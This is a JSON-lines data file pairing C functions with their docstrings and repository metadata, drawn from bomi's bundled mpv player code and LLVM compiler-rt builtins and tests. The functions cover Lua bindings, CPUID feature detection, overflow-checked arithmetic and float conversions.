{"docstring": "// Ensure that the given argument exists, even if it's nil. Can be used to\n// avoid confusing the last missing optional arg with the first temporary value\n// pushed to the stack.\n", "func_signal": "static void mp_lua_optarg(lua_State *L, int arg)", "code": "{\n    while (arg > lua_gettop(L))\n        lua_pushnil(L);\n}", "path": "src\\mpv\\player\\lua.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Read a 2 digit unsigned decimal integer.\n// Return -1 on failure.\n", "func_signal": "static int read_int_2(struct bstr *data)", "code": "{\n    *data = bstr_lstrip(*data);\n    if (data->len && data->start[0] == '-')\n        return -1;\n    struct bstr s = *data;\n    int res = (int)bstrtoll(s, &s, 10);\n    if (data->len == s.len || data->len - s.len > 2)\n        return -1;\n    *data = s;\n    return res;\n}", "path": "src\\mpv\\demux\\cue.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Get the offset from the given track to the video.\n", "func_signal": "double get_track_video_offset(struct MPContext *mpctx, struct track *track)", "code": "{\n    if (track && track->under_timeline)\n        return mpctx->video_offset;\n    if (track && track->is_external)\n        return get_start_time(mpctx);\n    return 0;\n}", "path": "src\\mpv\\player\\misc.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Create a talloc'ed copy of mpctx->global. It contains a copy of the global\n// option struct. It still just references some things though, like mp_log.\n// The main purpose is letting threads access the option struct without the\n// need for additional synchronization.\n", "func_signal": "struct mpv_global *create_sub_global(struct MPContext *mpctx)", "code": "{\n    struct mpv_global *new = talloc_ptrtype(NULL, new);\n    struct m_config *new_config = m_config_dup(new, mpctx->mconfig);\n    *new = (struct mpv_global){\n        .log = mpctx->global->log,\n        .opts = new_config->optstruct,\n    };\n    return new;\n}", "path": "src\\mpv\\player\\misc.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Execute \"require \" .. name\n", "func_signal": "static void require(lua_State *L, const char *name)", "code": "{\n    struct script_ctx *ctx = get_ctx(L);\n    MP_VERBOSE(ctx, \"loading %s\\n\", name);\n    // Lazy, but better than calling the \"require\" function manually\n    char buf[80];\n    snprintf(buf, sizeof(buf), \"require '%s'\", name);\n    if (luaL_loadstring(L, buf))\n        lua_error(L);\n    lua_call(L, 0, 0);\n}", "path": "src\\mpv\\player\\lua.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Push the table of a module. If it doesn't exist, it's created.\n// The Lua script can call \"require(module)\" to \"load\" it.\n", "func_signal": "static void push_module_table(lua_State *L, const char *module)", "code": "{\n    lua_getglobal(L, \"package\"); // package\n    lua_getfield(L, -1, \"loaded\"); // package loaded\n    lua_remove(L, -2); // loaded\n    lua_getfield(L, -1, module); // loaded module\n    if (lua_isnil(L, -1)) {\n        lua_pop(L, 1); // loaded\n        lua_newtable(L); // loaded module\n        lua_pushvalue(L, -1); // loaded module module\n        lua_setfield(L, -3, module); // loaded module\n    }\n    lua_remove(L, -2); // module\n}", "path": "src\\mpv\\player\\lua.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Creates a small userdata object and pushes it to the Lua stack. The function\n// will (on the C level) return a talloc object that will be released by the\n// userdata gc routine.\n// This can be used to free temporary C data structures correctly if Lua errors\n// happen.\n// You can't free the talloc context directly; the Lua __gc handler does this.\n// In my cases, talloc_free_children(returnval) will be used to free attached\n// memory in advance when it's known not to be needed anymore (a minor\n// optimization). Freeing it completely must be left to the Lua GC.\n", "func_signal": "static void *mp_lua_PITA(lua_State *L)", "code": "{\n    void **data = lua_newuserdata(L, sizeof(void *)); // u\n    if (luaL_newmetatable(L, \"ohthispain\")) { // u metatable\n        lua_pushvalue(L, -1);  // u metatable metatable\n        lua_setfield(L, -2, \"__index\");  // u metatable\n        lua_pushcfunction(L, destroy_crap); // u metatable gc\n        lua_setfield(L, -2, \"__gc\"); // u metatable\n    }\n    lua_setmetatable(L, -2); // u\n    *data = talloc_new(NULL);\n    return *data;\n}", "path": "src\\mpv\\player\\lua.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "/* NOTE: If vo.colorkey has bits set after the first 3 low order bytes\n *       we don't draw anything as this means it was forced to off. */\n", "func_signal": "static int xv_init_colorkey(struct vo *vo)", "code": "{\n    struct xvctx *ctx = vo->priv;\n    Display *display = vo->x11->display;\n    Atom xv_atom;\n    int rez;\n\n    /* check if colorkeying is needed */\n    xv_atom = xv_intern_atom_if_exists(vo, \"XV_COLORKEY\");\n    if (xv_atom != None && !(ctx->colorkey & 0xFF000000)) {\n        if (ctx->xv_ck_info.source == CK_SRC_CUR) {\n            int colorkey_ret;\n\n            rez = XvGetPortAttribute(display, ctx->xv_port, xv_atom,\n                                     &colorkey_ret);\n            if (rez == Success)\n                ctx->xv_colorkey = colorkey_ret;\n            else {\n                MP_FATAL(vo, \"Couldn't get colorkey! \"\n                         \"Maybe the selected Xv port has no overlay.\\n\");\n                return 0; // error getting colorkey\n            }\n        } else {\n            ctx->xv_colorkey = ctx->colorkey;\n\n            /* check if we have to set the colorkey too */\n            if (ctx->xv_ck_info.source == CK_SRC_SET) {\n                xv_atom = XInternAtom(display, \"XV_COLORKEY\", False);\n\n                rez = XvSetPortAttribute(display, ctx->xv_port, xv_atom,\n                                         ctx->colorkey);\n                if (rez != Success) {\n                    MP_FATAL(vo, \"Couldn't set colorkey!\\n\");\n                    return 0; // error setting colorkey\n                }\n            }\n        }\n\n        xv_atom = xv_intern_atom_if_exists(vo, \"XV_AUTOPAINT_COLORKEY\");\n\n        /* should we draw the colorkey ourselves or activate autopainting? */\n        if (ctx->xv_ck_info.method == CK_METHOD_AUTOPAINT) {\n            rez = !Success;\n\n            if (xv_atom != None) // autopaint is supported\n                rez = XvSetPortAttribute(display, ctx->xv_port, xv_atom, 1);\n\n            if (rez != Success)\n                ctx->xv_ck_info.method = CK_METHOD_MANUALFILL;\n        } else {\n            // disable colorkey autopainting if supported\n            if (xv_atom != None)\n                XvSetPortAttribute(display, ctx->xv_port, xv_atom, 0);\n        }\n    } else // do no colorkey drawing at all\n        ctx->xv_ck_info.method = CK_METHOD_NONE;\n\n    xv_print_ck_info(vo);\n\n    return 1;\n}", "path": "src\\mpv\\video\\out\\vo_xv.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Wrapper for ReadFile that treats ERROR_IO_PENDING as success\n", "func_signal": "static int async_read(HANDLE file, void *buf, unsigned size, OVERLAPPED* ol)", "code": "{\n    if (!ReadFile(file, buf, size, NULL, ol))\n        return (GetLastError() == ERROR_IO_PENDING) ? 0 : -1;\n    return 0;\n}", "path": "src\\mpv\\osdep\\subprocess-win.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Effects: aborts if a * b overflows\n", "func_signal": "COMPILER_RT_ABI di_int __mulvdi3(di_int a, di_int b)", "code": "{\n  const int N = (int)(sizeof(di_int) * CHAR_BIT);\n  const di_int MIN = (di_int)1 << (N - 1);\n  const di_int MAX = ~MIN;\n  if (a == MIN) {\n    if (b == 0 || b == 1)\n      return a * b;\n    compilerrt_abort();\n  }\n  if (b == MIN) {\n    if (a == 0 || a == 1)\n      return a * b;\n    compilerrt_abort();\n  }\n  di_int sa = a >> (N - 1);\n  di_int abs_a = (a ^ sa) - sa;\n  di_int sb = b >> (N - 1);\n  di_int abs_b = (b ^ sb) - sb;\n  if (abs_a < 2 || abs_b < 2)\n    return a * b;\n  if (sa == sb) {\n    if (abs_a > MAX / abs_b)\n      compilerrt_abort();\n  } else {\n    if (abs_a > MIN / -abs_b)\n      compilerrt_abort();\n  }\n  return a * b;\n}", "path": "lib\\builtins\\mulvdi3.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// The check below for i386 was copied from clang's cpuid.h (__get_cpuid_max).\n// Check motivated by bug reports for OpenSSL crashing on CPUs without CPUID\n// support. Consequently, for i386, the presence of CPUID is checked first\n// via the corresponding eflags bit.\n", "func_signal": "static bool isCpuIdSupported()", "code": "{\n#if defined(__GNUC__) || defined(__clang__)\n#if defined(__i386__)\n  int __cpuid_supported;\n  __asm__(\"  pushfl\\n\"\n          \"  popl   %%eax\\n\"\n          \"  movl   %%eax,%%ecx\\n\"\n          \"  xorl   $0x00200000,%%eax\\n\"\n          \"  pushl  %%eax\\n\"\n          \"  popfl\\n\"\n          \"  pushfl\\n\"\n          \"  popl   %%eax\\n\"\n          \"  movl   $0,%0\\n\"\n          \"  cmpl   %%eax,%%ecx\\n\"\n          \"  je     1f\\n\"\n          \"  movl   $1,%0\\n\"\n          \"1:\"\n          : \"=r\"(__cpuid_supported)\n          :\n          : \"eax\", \"ecx\");\n  if (!__cpuid_supported)\n    return false;\n#endif\n  return true;\n#endif\n  return true;\n}", "path": "lib\\builtins\\cpu_model.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Effects: aborts if a - b overflows\n", "func_signal": "COMPILER_RT_ABI si_int __subvsi3(si_int a, si_int b)", "code": "{\n  si_int s = (su_int)a - (su_int)b;\n  if (b >= 0) {\n    if (s > a)\n      compilerrt_abort();\n  } else {\n    if (s <= a)\n      compilerrt_abort();\n  }\n  return s;\n}", "path": "lib\\builtins\\subvsi3.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Find and parse the SystemVersion.plist file.\n", "func_signal": "static void parseSystemVersionPList(void *Unused)", "code": "{\n  (void)Unused;\n  // Load CoreFoundation dynamically\n  const void *NullAllocator = dlsym(RTLD_DEFAULT, \"kCFAllocatorNull\");\n  if (!NullAllocator)\n    return;\n  const CFAllocatorRef AllocatorNull = *(const CFAllocatorRef *)NullAllocator;\n  CFDataCreateWithBytesNoCopyFuncTy CFDataCreateWithBytesNoCopyFunc =\n      (CFDataCreateWithBytesNoCopyFuncTy)dlsym(RTLD_DEFAULT,\n                                               \"CFDataCreateWithBytesNoCopy\");\n  if (!CFDataCreateWithBytesNoCopyFunc)\n    return;\n  CFPropertyListCreateWithDataFuncTy CFPropertyListCreateWithDataFunc =\n      (CFPropertyListCreateWithDataFuncTy)dlsym(RTLD_DEFAULT,\n                                                \"CFPropertyListCreateWithData\");\n// CFPropertyListCreateWithData was introduced only in macOS 10.6+, so it\n// will be NULL on earlier OS versions.\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wdeprecated-declarations\"\n  CFPropertyListCreateFromXMLDataFuncTy CFPropertyListCreateFromXMLDataFunc =\n      (CFPropertyListCreateFromXMLDataFuncTy)dlsym(\n          RTLD_DEFAULT, \"CFPropertyListCreateFromXMLData\");\n#pragma clang diagnostic pop\n  // CFPropertyListCreateFromXMLDataFunc is deprecated in macOS 10.10, so it\n  // might be NULL in future OS versions.\n  if (!CFPropertyListCreateWithDataFunc && !CFPropertyListCreateFromXMLDataFunc)\n    return;\n  CFStringCreateWithCStringNoCopyFuncTy CFStringCreateWithCStringNoCopyFunc =\n      (CFStringCreateWithCStringNoCopyFuncTy)dlsym(\n          RTLD_DEFAULT, \"CFStringCreateWithCStringNoCopy\");\n  if (!CFStringCreateWithCStringNoCopyFunc)\n    return;\n  CFDictionaryGetValueFuncTy CFDictionaryGetValueFunc =\n      (CFDictionaryGetValueFuncTy)dlsym(RTLD_DEFAULT, \"CFDictionaryGetValue\");\n  if (!CFDictionaryGetValueFunc)\n    return;\n  CFGetTypeIDFuncTy CFGetTypeIDFunc =\n      (CFGetTypeIDFuncTy)dlsym(RTLD_DEFAULT, \"CFGetTypeID\");\n  if (!CFGetTypeIDFunc)\n    return;\n  CFStringGetTypeIDFuncTy CFStringGetTypeIDFunc =\n      (CFStringGetTypeIDFuncTy)dlsym(RTLD_DEFAULT, \"CFStringGetTypeID\");\n  if (!CFStringGetTypeIDFunc)\n    return;\n  CFStringGetCStringFuncTy CFStringGetCStringFunc =\n      (CFStringGetCStringFuncTy)dlsym(RTLD_DEFAULT, \"CFStringGetCString\");\n  if (!CFStringGetCStringFunc)\n    return;\n  CFReleaseFuncTy CFReleaseFunc =\n      (CFReleaseFuncTy)dlsym(RTLD_DEFAULT, \"CFRelease\");\n  if (!CFReleaseFunc)\n    return;\n\n  char *PListPath = \"/System/Library/CoreServices/SystemVersion.plist\";\n\n#if TARGET_OS_SIMULATOR\n  char *PListPathPrefix = getenv(\"IPHONE_SIMULATOR_ROOT\");\n  if (!PListPathPrefix)\n    return;\n  char FullPath[strlen(PListPathPrefix) + strlen(PListPath) + 1];\n  strcpy(FullPath, PListPathPrefix);\n  strcat(FullPath, PListPath);\n  PListPath = FullPath;\n#endif\n  FILE *PropertyList = fopen(PListPath, \"r\");\n  if (!PropertyList)\n    return;\n\n  // Dynamically allocated stuff.\n  CFDictionaryRef PListRef = NULL;\n  CFDataRef FileContentsRef = NULL;\n  UInt8 *PListBuf = NULL;\n\n  fseek(PropertyList, 0, SEEK_END);\n  long PListFileSize = ftell(PropertyList);\n  if (PListFileSize < 0)\n    goto Fail;\n  rewind(PropertyList);\n\n  PListBuf = malloc((size_t)PListFileSize);\n  if (!PListBuf)\n    goto Fail;\n\n  size_t NumRead = fread(PListBuf, 1, (size_t)PListFileSize, PropertyList);\n  if (NumRead != (size_t)PListFileSize)\n    goto Fail;\n\n  // Get the file buffer into CF's format. We pass in a null allocator here *\n  // because we free PListBuf ourselves\n  FileContentsRef = (*CFDataCreateWithBytesNoCopyFunc)(\n      NULL, PListBuf, (CFIndex)NumRead, AllocatorNull);\n  if (!FileContentsRef)\n    goto Fail;\n\n  if (CFPropertyListCreateWithDataFunc)\n    PListRef = (*CFPropertyListCreateWithDataFunc)(\n        NULL, FileContentsRef, CF_PROPERTY_LIST_IMMUTABLE, NULL, NULL);\n  else\n    PListRef = (*CFPropertyListCreateFromXMLDataFunc)(\n        NULL, FileContentsRef, CF_PROPERTY_LIST_IMMUTABLE, NULL);\n  if (!PListRef)\n    goto Fail;\n\n  CFStringRef ProductVersion = (*CFStringCreateWithCStringNoCopyFunc)(\n      NULL, \"ProductVersion\", CF_STRING_ENCODING_ASCII, AllocatorNull);\n  if (!ProductVersion)\n    goto Fail;\n  CFTypeRef OpaqueValue = (*CFDictionaryGetValueFunc)(PListRef, ProductVersion);\n  (*CFReleaseFunc)(ProductVersion);\n  if (!OpaqueValue ||\n      (*CFGetTypeIDFunc)(OpaqueValue) != (*CFStringGetTypeIDFunc)())\n    goto Fail;\n\n  char VersionStr[32];\n  if (!(*CFStringGetCStringFunc)((CFStringRef)OpaqueValue, VersionStr,\n                                 sizeof(VersionStr), CF_STRING_ENCODING_UTF8))\n    goto Fail;\n  sscanf(VersionStr, \"%d.%d.%d\", &GlobalMajor, &GlobalMinor, &GlobalSubminor);\n\nFail:\n  if (PListRef)\n    (*CFReleaseFunc)(PListRef);\n  if (FileContentsRef)\n    (*CFReleaseFunc)(FileContentsRef);\n  free(PListBuf);\n  fclose(PropertyList);\n}", "path": "lib\\builtins\\os_version_check.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "/// getX86CpuIDAndInfoEx - Execute the specified cpuid with subleaf and return\n/// the 4 values in the specified arguments.  If we can't run cpuid on the host,\n/// return true.\n", "func_signal": "static bool getX86CpuIDAndInfoEx(unsigned value, unsigned subleaf,\n                                 unsigned *rEAX, unsigned *rEBX, unsigned *rECX,\n                                 unsigned *rEDX)", "code": "{\n#if defined(__GNUC__) || defined(__clang__)\n#if defined(__x86_64__)\n  // gcc doesn't know cpuid would clobber ebx/rbx. Preserve it manually.\n  // FIXME: should we save this for Clang?\n  __asm__(\"movq\\t%%rbx, %%rsi\\n\\t\"\n          \"cpuid\\n\\t\"\n          \"xchgq\\t%%rbx, %%rsi\\n\\t\"\n          : \"=a\"(*rEAX), \"=S\"(*rEBX), \"=c\"(*rECX), \"=d\"(*rEDX)\n          : \"a\"(value), \"c\"(subleaf));\n  return false;\n#elif defined(__i386__)\n  __asm__(\"movl\\t%%ebx, %%esi\\n\\t\"\n          \"cpuid\\n\\t\"\n          \"xchgl\\t%%ebx, %%esi\\n\\t\"\n          : \"=a\"(*rEAX), \"=S\"(*rEBX), \"=c\"(*rECX), \"=d\"(*rEDX)\n          : \"a\"(value), \"c\"(subleaf));\n  return false;\n#else\n  return true;\n#endif\n#elif defined(_MSC_VER)\n  int registers[4];\n  __cpuidex(registers, value, subleaf);\n  *rEAX = registers[0];\n  *rEBX = registers[1];\n  *rECX = registers[2];\n  *rEDX = registers[3];\n  return false;\n#else\n  return true;\n#endif\n}", "path": "lib\\builtins\\cpu_model.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Convert a signed 128-bit integer to long double.\n// This uses the following property:  Let hi and lo be 64-bits each,\n// and let signed_val_k() and unsigned_val_k() be the value of the\n// argument interpreted as a signed or unsigned k-bit integer. Then,\n//\n// signed_val_128(hi,lo) = signed_val_64(hi) * 2^64 + unsigned_val_64(lo)\n// = (long double)hi * 2^64 + (long double)lo,\n//\n// where (long double)hi and (long double)lo are signed and\n// unsigned 64-bit integer to long double conversions, respectively.\n", "func_signal": "long double __floattitf(__int128_t arg)", "code": "{\n  // Split the int128 argument into 64-bit high and low int64 parts.\n  int64_t ArgHiPart = (int64_t)(arg >> 64);\n  uint64_t ArgLoPart = (uint64_t)arg;\n\n  // Convert each 64-bit part into long double. The high part\n  // must be a signed conversion and the low part an unsigned conversion\n  // to ensure the correct result.\n  long double ConvertedHiPart = __floatditf(ArgHiPart);\n  long double ConvertedLoPart = __floatunditf(ArgLoPart);\n\n  // The low bit of ArgHiPart corresponds to the 2^64 bit in arg.\n  // Multiply the high part by 2^64 to undo the right shift by 64-bits\n  // done in the splitting. Then, add to the low part to obtain the\n  // final result.\n  return ((ConvertedHiPart * 0x1.0p64) + ConvertedLoPart);\n}", "path": "lib\\builtins\\ppc\\floattitf.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Effects: aborts if -a overflows\n", "func_signal": "COMPILER_RT_ABI si_int __negvsi2(si_int a)", "code": "{\n  const si_int MIN = (si_int)1 << ((int)(sizeof(si_int) * CHAR_BIT) - 1);\n  if (a == MIN)\n    compilerrt_abort();\n  return -a;\n}", "path": "lib\\builtins\\negvsi2.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Returns: a / b, *rem = a % b\n", "func_signal": "COMPILER_RT_ABI su_int __udivmodsi4(su_int a, su_int b, su_int *rem)", "code": "{\n  si_int d = __udivsi3(a, b);\n  *rem = a - (d * b);\n  return d;\n}", "path": "lib\\builtins\\udivmodsi4.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// gggg gggg gggg gggg gggg gggg gggg gggg | gggg gggg gggg gggg seee eeee eeee\n// eeee | 1mmm mmmm mmmm mmmm mmmm mmmm mmmm mmmm | mmmm mmmm mmmm mmmm mmmm\n// mmmm mmmm mmmm\n", "func_signal": "COMPILER_RT_ABI long double __floatundixf(du_int a)", "code": "{\n  if (a == 0)\n    return 0.0;\n  const unsigned N = sizeof(du_int) * CHAR_BIT;\n  int clz = __builtin_clzll(a);\n  int e = (N - 1) - clz; // exponent\n  long_double_bits fb;\n  fb.u.high.s.low = (e + 16383); // exponent\n  fb.u.low.all = a << clz;       // mantissa\n  return fb.f;\n}", "path": "lib\\builtins\\floatundixf.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Allocates a chunk, and attempts to free it \"simultaneously\" by 2 threads.\n", "func_signal": "void child(void)", "code": "{\n  void *p = malloc(16);\n  for (int i = 0; i < kNumThreads; i++)\n    pthread_create(&tid[i], 0, thread_free, p);\n  pthread_mutex_lock(&mutex);\n  go = 1;\n  pthread_cond_broadcast(&cond);\n  pthread_mutex_unlock(&mutex);\n  for (int i = 0; i < kNumThreads; i++)\n    pthread_join(tid[i], 0);\n}", "path": "test\\scudo\\dealloc-race.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Read control register 0 (XCR0). Used to detect features such as AVX.\n", "func_signal": "static bool getX86XCR0(unsigned *rEAX, unsigned *rEDX)", "code": "{\n#if defined(__GNUC__) || defined(__clang__)\n  // Check xgetbv; this uses a .byte sequence instead of the instruction\n  // directly because older assemblers do not include support for xgetbv and\n  // there is no easy way to conditionally compile based on the assembler used.\n  __asm__(\".byte 0x0f, 0x01, 0xd0\" : \"=a\"(*rEAX), \"=d\"(*rEDX) : \"c\"(0));\n  return false;\n#elif defined(_MSC_FULL_VER) && defined(_XCR_XFEATURE_ENABLED_MASK)\n  unsigned long long Result = _xgetbv(_XCR_XFEATURE_ENABLED_MASK);\n  *rEAX = Result;\n  *rEDX = Result >> 32;\n  return false;\n#else\n  return true;\n#endif\n}", "path": "lib\\builtins\\cpu_model.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Convert long double into an unsigned 128-bit integer.\n", "func_signal": "__uint128_t __fixunstfti(long double input)", "code": "{\n\n  // If we are trying to convert a NaN, return the NaN bit pattern.\n  if (crt_isnan(input)) {\n    return ((__uint128_t)0x7FF8000000000000ll) << 64 |\n           (__uint128_t)0x0000000000000000ll;\n  }\n\n  __uint128_t result, hiResult, loResult;\n  int hiExponent, loExponent, shift;\n  // The long double representation, with the high and low portions of\n  // the long double, and the corresponding bit patterns of each double.\n  union {\n    long double ld;\n    double d[2];               // [0] is the high double, [1] is the low double.\n    unsigned long long ull[2]; // High and low doubles as 64-bit integers.\n  } ldUnion;\n\n  // If the long double is less than 1.0 or negative,\n  // return 0.0.\n  if (input < 1.0)\n    return 0.0;\n\n  // Retrieve the 64-bit patterns of high and low doubles.\n  // Compute the unbiased exponent of both high and low doubles by\n  // removing the signs, isolating the exponent, and subtracting\n  // the bias from it.\n  ldUnion.ld = input;\n  hiExponent = ((ldUnion.ull[0] & 0x7FFFFFFFFFFFFFFFll) >> 52) - BIAS;\n  loExponent = ((ldUnion.ull[1] & 0x7FFFFFFFFFFFFFFFll) >> 52) - BIAS;\n\n  // Convert each double into int64; they will be added to the int128 result.\n  // CASE 1: High or low double fits in int64\n  //      - Convert the each double normally into int64.\n  //\n  // CASE 2: High or low double does not fit in int64\n  //      - Scale the double to fit within a 64-bit integer\n  //      - Calculate the shift (amount to scale the double by in the int128)\n  //      - Clear all the bits of the exponent (with 0x800FFFFFFFFFFFFF)\n  //      - Add BIAS+53 (0x4350000000000000) to exponent to correct the value\n  //      - Scale (move) the double to the correct place in the int128\n  //        (Move it by 2^53 places)\n  //\n  // Note: If the high double is assumed to be positive, an unsigned conversion\n  // from long double to 64-bit integer is needed. The low double can be either\n  // positive or negative, so a signed conversion is needed to retain the result\n  // of the low double and to ensure it does not simply get converted to 0.\n\n  // CASE 1 - High double fits in int64.\n  if (hiExponent < 63) {\n    hiResult = (unsigned long long)ldUnion.d[0];\n  } else if (hiExponent < 128) {\n    // CASE 2 - High double does not fit in int64, scale and convert it.\n    shift = hiExponent - 54;\n    ldUnion.ull[0] &= 0x800FFFFFFFFFFFFFll;\n    ldUnion.ull[0] |= 0x4350000000000000ll;\n    hiResult = (unsigned long long)ldUnion.d[0];\n    hiResult <<= shift;\n  } else {\n    // Detect cases for overflow. When the exponent of the high\n    // double is greater than 128 bits and when the long double\n    // input is positive, return the max 128-bit integer.\n    // For negative inputs with exponents > 128, return 1, like gcc.\n    if (ldUnion.d[0] > 0) {\n      return ((__uint128_t)0xFFFFFFFFFFFFFFFFll) << 64 |\n             (__uint128_t)0xFFFFFFFFFFFFFFFFll;\n    } else {\n      return ((__uint128_t)0x0000000000000000ll) << 64 |\n             (__uint128_t)0x0000000000000001ll;\n    }\n  }\n\n  // CASE 1 - Low double fits in int64.\n  if (loExponent < 63) {\n    loResult = (long long)ldUnion.d[1];\n  } else {\n    // CASE 2 - Low double does not fit in int64, scale and convert it.\n    shift = loExponent - 54;\n    ldUnion.ull[1] &= 0x800FFFFFFFFFFFFFll;\n    ldUnion.ull[1] |= 0x4350000000000000ll;\n    loResult = (long long)ldUnion.d[1];\n    loResult <<= shift;\n  }\n\n  // Add the high and low doublewords together to form a 128 bit integer.\n  result = loResult + hiResult;\n  return result;\n}", "path": "lib\\builtins\\ppc\\fixunstfti.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "/// getX86CpuIDAndInfo - Execute the specified cpuid and return the 4 values in\n/// the specified arguments.  If we can't run cpuid on the host, return true.\n", "func_signal": "static bool getX86CpuIDAndInfo(unsigned value, unsigned *rEAX, unsigned *rEBX,\n                               unsigned *rECX, unsigned *rEDX)", "code": "{\n#if defined(__GNUC__) || defined(__clang__)\n#if defined(__x86_64__)\n  // gcc doesn't know cpuid would clobber ebx/rbx. Preserve it manually.\n  // FIXME: should we save this for Clang?\n  __asm__(\"movq\\t%%rbx, %%rsi\\n\\t\"\n          \"cpuid\\n\\t\"\n          \"xchgq\\t%%rbx, %%rsi\\n\\t\"\n          : \"=a\"(*rEAX), \"=S\"(*rEBX), \"=c\"(*rECX), \"=d\"(*rEDX)\n          : \"a\"(value));\n  return false;\n#elif defined(__i386__)\n  __asm__(\"movl\\t%%ebx, %%esi\\n\\t\"\n          \"cpuid\\n\\t\"\n          \"xchgl\\t%%ebx, %%esi\\n\\t\"\n          : \"=a\"(*rEAX), \"=S\"(*rEBX), \"=c\"(*rECX), \"=d\"(*rEDX)\n          : \"a\"(value));\n  return false;\n#else\n  return true;\n#endif\n#elif defined(_MSC_VER)\n  // The MSVC intrinsic is portable across x86 and x64.\n  int registers[4];\n  __cpuid(registers, value);\n  *rEAX = registers[0];\n  *rEBX = registers[1];\n  *rECX = registers[2];\n  *rEDX = registers[3];\n  return false;\n#else\n  return true;\n#endif\n}", "path": "lib\\builtins\\cpu_model.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Effects: aborts if a * b overflows\n", "func_signal": "COMPILER_RT_ABI ti_int __mulvti3(ti_int a, ti_int b)", "code": "{\n  const int N = (int)(sizeof(ti_int) * CHAR_BIT);\n  const ti_int MIN = (ti_int)1 << (N - 1);\n  const ti_int MAX = ~MIN;\n  if (a == MIN) {\n    if (b == 0 || b == 1)\n      return a * b;\n    compilerrt_abort();\n  }\n  if (b == MIN) {\n    if (a == 0 || a == 1)\n      return a * b;\n    compilerrt_abort();\n  }\n  ti_int sa = a >> (N - 1);\n  ti_int abs_a = (a ^ sa) - sa;\n  ti_int sb = b >> (N - 1);\n  ti_int abs_b = (b ^ sb) - sb;\n  if (abs_a < 2 || abs_b < 2)\n    return a * b;\n  if (sa == sb) {\n    if (abs_a > MAX / abs_b)\n      compilerrt_abort();\n  } else {\n    if (abs_a > MIN / -abs_b)\n      compilerrt_abort();\n  }\n  return a * b;\n}", "path": "lib\\builtins\\mulvti3.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Frees the pointer passed when signaled to.\n", "func_signal": "void *thread_free(void *p)", "code": "{\n  pthread_mutex_lock(&mutex);\n  while (!go)\n    pthread_cond_wait(&cond, &mutex);\n  pthread_mutex_unlock(&mutex);\n  free(p);\n  return 0;\n}", "path": "test\\scudo\\dealloc-race.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Returns: a ^ b\n", "func_signal": "COMPILER_RT_ABI long double __powixf2(long double a, si_int b)", "code": "{\n  const int recip = b < 0;\n  long double r = 1;\n  while (1) {\n    if (b & 1)\n      r *= a;\n    b /= 2;\n    if (b == 0)\n      break;\n    a *= a;\n  }\n  return recip ? 1 / r : r;\n}", "path": "lib\\builtins\\powixf2.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// CONFIG\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n    struct stuff {\n        long int a;\n        long int b;\n        long int c;\n    } localStuff = { 10, 20, 30 };\n    int d;\n    \n    void (^a)(void) = ^ { printf(\"d is %d\", d); };\n    void (^b)(void) = ^ { printf(\"d is %d, localStuff.a is %lu\", d, localStuff.a); };\n\n    unsigned nominalsize = Block_size(b) - Block_size(a);\n#if __cplusplus__\n    // need copy+dispose helper for C++ structures\n    nominalsize += 2*sizeof(void*);\n#endif\n    if ((Block_size(b) - Block_size(a)) != nominalsize) {\n        printf(\"sizeof a is %ld, sizeof b is %ld, expected %d\\n\", Block_size(a), Block_size(b), nominalsize);\n        printf(\"dump of b is %s\\n\", _Block_dump(b));\n        return 1;\n    }\n    printf(\"%s: Success\\n\", argv[0]);\n    return 0;\n}", "path": "test\\BlocksRuntime\\structmember.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
